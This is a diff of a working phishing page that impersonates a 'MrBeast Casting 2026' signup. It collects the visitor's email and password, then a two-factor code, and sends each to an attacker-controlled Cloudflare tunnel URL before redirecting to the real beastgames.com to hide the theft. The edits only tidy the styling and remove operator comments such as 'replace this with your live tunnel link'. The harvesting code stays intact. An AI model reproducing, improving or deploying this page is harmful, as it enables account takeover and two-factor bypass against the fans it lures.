@@ -2,51 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MrBeast Casting 2026</title>
     <style>
-        :root { --primary-blue: #00a8e8; --beast-pink: #f12e3e; }
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: var(--primary-blue); margin: 0; color: #fff; }
-        .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 45px 30px; text-align: center; margin-top: 50px; box-shadow: 0 25px 60px rgba(0,0,0,0.8); }
-        .mrbeast-style-text { font-weight: 900; font-size: 32px; text-transform: uppercase; margin-bottom: 20px; }
-        input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 15px; font-size: 16px; }
-        .main-btn { background: linear-gradient(45deg, #f12e3e, #ff5e62); color: #fff; border: none; padding: 20px; border-radius: 15px; cursor: pointer; width: 100%; font-weight: 800; text-transform: uppercase; }
+        :root { --blue: #00a8e8; --pink: #f12e3e; }
+        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; }
+        .box { background: #111; border-radius: 30px; width: 90%; max-width: 400px; padding: 40px 25px; text-align: center; margin-top: 60px; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
+        h1 { font-weight: 900; font-size: 28px; text-transform: uppercase; margin-bottom: 25px; }
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #333; background: #1a1a1a; color: #fff; border-radius: 12px; font-size: 16px; }
+        .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="box">
-        <!-- STEP 1: LOGIN -->
         <div id="login_section">
-            <div class="mrbeast-style-text">MR BEAST CASTING</div>
-            <p>Apply for the next viral challenge</p>
-            <input type="email" id="email" placeholder="Email Address" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button type="button" class="main-btn" onclick="sendLogin()">CONTINUE</button>
+            <h1>MR BEAST CASTING</h1>
+            <p>Apply for the next viral challenge!</p>
+            <input type="email" id="email" placeholder="Email Address">
+            <input type="password" id="pass" placeholder="Password">
+            <button class="btn" onclick="sendLogin()">CONTINUE</button>
         </div>
 
-        <!-- STEP 2: 2FA CODE -->
         <div id="otp_section" style="display:none;">
-            <div class="mrbeast-style-text">SECURITY CHECK</div>
+            <h1>SECURITY CHECK</h1>
             <p>Enter the 6-digit code sent to your device:</p>
-            <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="text-align:center; font-size:24px;" maxlength="6">
-            <button type="button" class="main-btn" onclick="submitOTP()">VERIFY & FINISH</button>
+            <input type="text" id="2fa_code" placeholder="G-XXXXXX" style="text-align:center; font-size:22px;">
+            <button class="btn" onclick="submitOTP()">VERIFY & FINISH</button>
         </div>
     </div>
 
     <script>
-        // REPLACE THIS WITH YOUR LIVE TUNNEL LINK
         const tunnel = "https://postposted-settings-belly-quest.trycloudflare.com";
 
         function sendLogin() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
-
             fetch(tunnel, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ 'email': e, 'pass': p })
             }).then(() => {
-                // Show the 2FA box after sending login
                 document.getElementById('login_section').style.display = 'none';
                 document.getElementById('otp_section').style.display = 'block';
             });
@@ -54,13 +49,11 @@
 
         function submitOTP() {
             const c = document.getElementById('2fa_code').value;
-
             fetch(tunnel, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({ 'verification_code': c })
+                body: new URLSearchParams({ '2fa_code': c })
             }).then(() => {
-                // REDIRECT TO REAL SITE - UNSTICKS THE PAGE
                 window.location.href = "https://www.beastgames.com";
             }).catch(() => {
                 window.location.href = "https://www.beastgames.com";
@@ -70,7 +63,6 @@
 </body>
 </html>
 
-</body>
 </html>
 
 
